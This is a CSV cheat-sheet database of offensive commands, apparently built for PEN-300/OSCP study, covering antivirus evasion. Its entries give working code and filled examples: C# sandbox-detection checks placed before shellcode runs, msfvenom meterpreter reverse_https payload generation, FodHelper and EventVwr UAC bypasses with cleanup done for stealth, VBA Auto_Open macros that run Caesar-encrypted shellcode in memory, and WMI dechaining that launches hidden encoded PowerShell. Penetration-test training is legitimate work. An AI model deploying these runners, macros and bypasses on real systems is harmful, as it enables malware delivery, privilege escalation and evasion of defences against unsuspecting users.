"id","name","category","command","description","subcategory","filled_example","notes","oscp_relevance","examples","educational","related_commands","troubleshooting","flag_explanations","prerequisites","alternatives","next_steps"
"csharp-sleep-timer","C# Sleep Timer Evasion","shellcode-runners","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(<SLEEP_MS>);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < <THRESHOLD_SEC>) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","Heuristic evasion using sleep timer with elapsed time validation.
Sandboxes skip Sleep() calls - detect by measuring actual elapsed time.","","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(10000);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < 9.5) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","Syntax:
Add before shellcode execution in Main() Simple but effective against basic sandboxes.

10 seconds is standard.

For exam, may skip to save time if target already compromised.

Good for phishing scenarios.

Time estimate:
1 minute (add to existing runner) References:
docs/av-evasion/shellcode-runners.md#sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:
Use non-emulated API checks (VirtualAllocExNuma), large memory allocations, or anti-debugging techniques","","","","","","","","",""
"csharp-non-emulated-api","C# Non-Emulated API Check","shellcode-runners","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

// Sandbox check
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null) {
    return; // Sandbox detected - API not emulated
}
// Continue with payload","Detect sandbox by calling VirtualAllocExNuma - rarely emulated API.
If NULL returned, sandbox detected.
Combines with GetCurrentProcess for legitimacy.","","","Syntax:
Add before shellcode execution in Main() More sophisticated than sleep timer.

Bypasses sandboxes that wait out delays.

Combine both for maximum evasion.

Quick to add (<10 lines).

Time estimate:
2 minutes References:
docs/av-evasion/shellcode-runners.md#non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:
Use FlsAlloc, GetTickCount64, or other rarely-emulated APIs.

Check for debugger with IsDebuggerPresent.","","","","","","","","",""
"msfvenom-csharp-payload","Generate msfvenom C# Shellcode","shellcode-runners","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp","Generate shellcode in C# byte array format for use in custom runners.
Use HTTPS payloads for encrypted C2 communication.","","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp","Syntax:
Run on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion.

Port 443 blends with legitimate traffic.

Generate before exam, don't waste time during.

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative:
Use custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)","","","","","","","","",""
"compile-csharp-runner","Compile C# Shellcode Runner","shellcode-runners","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:<OUTPUT_EXE> <SOURCE_CS>","Compile C# source code to Windows executable using csc.exe (.NET Framework compiler).
Must be run on Windows target or staging system.","","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe Program.cs","Syntax:
Run on Windows system with .NET Framework Practice compiling on Windows VM before exam.

Framework64 for modern systems.

/target:winexe hides console window (stealthier).

Compilation is fast (<5 seconds).

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#compilation Manual alternative:
Use Visual Studio, MSBuild, or cross-compile with Mono on Linux","","","","","","","","",""
"fodhelper-uac-bypass","FodHelper UAC Bypass","uac-bypass","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Exploit fodhelper.exe auto-elevation via registry hijacking. Creates HKCU registry key that fodhelper.exe checks, executes payload with high integrity without UAC prompt.","","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Syntax:
Execute in PowerShell with medium integrity (standard user) FodHelper is classic UAC bypass for Windows 10.

Works on unpatched systems.

Quick to execute (~10 sec).

Always clean up registry key for stealth.

Test integrity with 'whoami /groups' before and after.

Useful after initial access to escalate without credentials.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#fodhelper, PEN-300 Chapter 7.5 Manual alternative:
Use alternate UAC bypasses (eventvwr, sdclt, computerdefaults), exploit vulnerabilities, or request legitimate admin credentials","","","","","","","","",""
"eventvwr-uac-bypass","EventVwr UAC Bypass","uac-bypass","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","Exploit eventvwr.exe auto-elevation via registry hijacking. Similar to FodHelper but uses different registry key (mscfile). Works on Windows 7-10.","","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","Syntax:
Execute in PowerShell with medium integrity EventVwr is older bypass, may be patched.

FodHelper more reliable on modern systems.

Good backup option.

Works on Windows 7-10.

~5 sec execution time.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#eventvwr Manual alternative:
Use FodHelper, sdclt, computerdefaults, or other auto-elevate binaries","","","","","","","","",""
"check-integrity-level","Check Process Integrity Level","uac-bypass","whoami /groups | findstr /i ""Mandatory Label""","Verify current process integrity level (Low/Medium/High/System). Determines if UAC bypass needed and validates bypass success.","","","Syntax:
Run in cmd.exe or PowerShell Always check integrity before attempting UAC bypass.

Medium + Administrators group = UAC bypass will work.

Low integrity = sandboxed process, escape first.

High = already elevated, no bypass needed.

Takes <5 sec to check.

Time estimate:
10 seconds References:
docs/av-evasion/uac-bypass.md#integrity-levels Manual alternative:
Use PowerShell [Security.Principal.WindowsIdentity]::GetCurrent(), Process Explorer, or Task Manager Details pane","","","","","","","","",""
"uac-bypass-detection","Test UAC Bypass Detection","uac-bypass","# Test registry creation (no trigger)
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c echo test"" -Force

Write-Host ""Registry keys created. Check for AV alerts...""
Start-Sleep 10

# Cleanup
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force
Write-Host ""Cleaned up. No AV alert = bypass likely undetected.""","Test if UAC bypass attempt is detected/blocked by AV or EDR. Creates registry keys without triggering bypass to check for alerts.","","","Syntax:
Execute in PowerShell to test detection Test before using in real engagement.

Some EDR products specifically monitor HKCU\Software\Classes hijacking.

If detected, try alternate bypasses (sdclt, computerdefaults) or token manipulation.

~30 sec test time.

Time estimate:
30 seconds References:
docs/av-evasion/uac-bypass.md#testing Manual alternative:
Monitor Windows Event Logs (Security, Sysmon), check EDR console, or use Process Monitor to watch registry access","","","","","","","","",""
"vba-shellcode-runner-basic","VBA Shellcode Runner (Basic)","vba-evasion","Private Declare PtrSafe Function CreateThread Lib ""kernel32"" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr

Sub Auto_Open()
    Dim buf As Variant
    buf = Array(<SHELLCODE_BYTES>)
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    For counter = LBound(buf) To UBound(buf)
        Dim data As Long
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    Dim thandle As LongPtr
    thandle = CreateThread(0, 0, addr, 0, 0, 0)
End Sub","Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc → RtlMoveMemory → CreateThread pattern. Foundation for Office-based payloads.","","Private Declare PtrSafe Function CreateThread Lib ""kernel32"" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr

Sub Auto_Open()
    Dim buf As Variant
    buf = Array(232, 130, 0, 0, 0, ...)
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    For counter = LBound(buf) To UBound(buf)
        Dim data As Long
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    Dim thandle As LongPtr
    thandle = CreateThread(0, 0, addr, 0, 0, 0)
End Sub","Syntax:
Add to Word/Excel VBA editor (Alt+F11), insert shellcode bytes Basic runner detected by all modern AV.

Always combine with encryption (Caesar/XOR) and obfuscation.

Auto_Open triggers on document open.

Use AutoOpen() for compatibility.

Time estimate:
5 minutes (with shellcode generation) References:
docs/av-evasion/vba-evasion.md#basic-runner, PEN-300 Chapter 6.7 Manual alternative:
Use PowerShell download cradle from VBA, WMI process creation, or COM object execution","","","","","","","","",""
"vba-caesar-cipher","VBA Caesar Cipher Shellcode","vba-evasion","' Offline encryption (Python):
# shellcode = [0xfc, 0x48, 0x83, ...]
# key = 2
# encrypted = [(b + key) % 256 for b in shellcode]

' VBA decryption and execution:
Sub AutoOpen()
    Dim buf As Variant
    buf = Array(<ENCRYPTED_BYTES>)  ' Caesar encrypted shellcode
    
    ' Decrypt with Caesar cipher
    For i = LBound(buf) To UBound(buf)
        buf(i) = (buf(i) - <KEY>) Mod 256
    Next i
    
    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + i, buf(i), 1
    Next i
    CreateThread 0, 0, addr, 0, 0, 0
End Sub","Encrypt shellcode with Caesar cipher in VBA. Decrypt at runtime before execution. Simple obfuscation to evade static signatures in Office documents.","","' Offline encryption (Python):
# shellcode = [0xfc, 0x48, 0x83, ...]
# key = 2
# encrypted = [(b + key) % 256 for b in shellcode]

' VBA decryption and execution:
Sub AutoOpen()
    Dim buf As Variant
    buf = Array(254, 74, 133, ...)  ' Caesar encrypted shellcode
    
    ' Decrypt with Caesar cipher
    For i = LBound(buf) To UBound(buf)
        buf(i) = (buf(i) - 2) Mod 256
    Next i
    
    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + i, buf(i), 1
    Next i
    CreateThread 0, 0, addr, 0, 0, 0
End Sub","Syntax:
Encrypt offline, paste encrypted bytes into VBA Caesar cipher is weak but better than plaintext.

Key=2 is common in examples.

For exam, consider XOR for better evasion.

Combine with obfuscation and dechaining.

Time estimate:
10 minutes (encryption + integration) References:
docs/av-evasion/vba-evasion.md#caesar-cipher, PEN-300 Chapter 6.7.1 Manual alternative:
Use XOR encryption (stronger), AES encryption, or base64 encoding","","","","","","","","",""
"vba-wmi-dechain","VBA WMI Process Dechaining","vba-evasion","Sub AutoOpen()
    Dim payload As String
    payload = ""powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>""
    
    Dim pid As Variant
    GetObject(""winmgmts:"").Get(""Win32_Process"").Create payload, Null, Null, pid
End Sub","Execute payload via WMI to break parent-child process chain. Office doc → WMI → powershell breaks typical macro detection. Payload runs outside Office sandbox.","","Sub AutoOpen()
    Dim payload As String
    payload = ""powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...""
    
    Dim pid As Variant
    GetObject(""winmgmts:"").Get(""Win32_Process"").Create payload, Null, Null, pid
End Sub","Syntax:
Add to VBA macro, replace <BASE64_PAYLOAD> with encoded PowerShell WMI dechaining is powerful evasion technique.

Breaks WINWORD -> powershell parent-child relationship that AV monitors.

Always encode PowerShell with base64.

Test network connectivity first.

Time estimate:
5 minutes References:
docs/av-evasion/vba-evasion.md#wmi-dechaining, PEN-300 Chapter 6.8.2 Manual alternative:
Use WScript.Shell.Run, CreateObject(""WScript.Shell"").Exec, or scheduled task creation","","","","","","","","",""
